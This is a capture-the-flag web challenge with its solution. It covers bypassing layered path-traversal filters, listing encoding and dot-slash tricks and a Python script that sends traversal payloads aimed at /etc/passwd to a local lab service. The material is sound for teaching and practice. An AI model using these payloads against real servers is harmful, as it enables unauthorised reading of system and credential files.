# Challenge 14: Filter Bypass (Upgraded from Path Traversal)
# Category: Web
# Points: 400
# Difficulty: MEDIUM-HARD

## Description
I added filters to prevent path traversal attacks. But can you bypass ALL of them?

**Service:** `http://HOST:5005`

## Security Filters (Multiple Layers!)

The server now has these filters:

```python
# Filter 1: Block ../
if '../' in filename:
    return "Blocked!"

# Filter 2: Block encoded variants
if '%2e%2e%2f' in filename.lower():
    return "Blocked!"

# Filter 3: Block null bytes
if '%00' in filename:
    return "Blocked!"

# Filter 4: Block absolute paths
if filename.startswith('/'):
    return "Blocked!"

# Filter 5: Normalize path
filename = os.path.normpath(filename)
```

## Bypass Techniques

### 1. Double Encoding
```
..%252f → decoded once → ..%2f → decoded twice → ../
```

### 2. UTF-8 Encoding
```
..%c0%af → overlong encoding for /
```

### 3. Path Truncation
```
././././././././././etc/passwd
```

### 4. Null Byte (if not filtered)
```
../../../etc/passwd%00.png
```

### 5. Case Sensitivity
```
../ → check if filter is case-sensitive
..%2F → uppercase hex
```

### 6. Double Slashes
```
..//..//..//etc/passwd
```

### 7. Dot Tricks
```
....//....//etc/passwd
```

### 8. Windows Path (if applicable)
```
..\..\..\etc\passwd
```

## Solution

```python
import requests

# Try multiple bypass techniques
payloads = [
    "....//....//....//etc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "..%255c..%255c..%255cetc/passwd",
    "..%00/..%00/..%00/etc/passwd",
    "/var/www/html/../../../etc/passwd",
]

for payload in payloads:
    r = requests.get(f"http://localhost:5005?file={payload}")
    if "flag{" in r.text:
        print(f"Found: {payload}")
        print(r.text)
        break
```
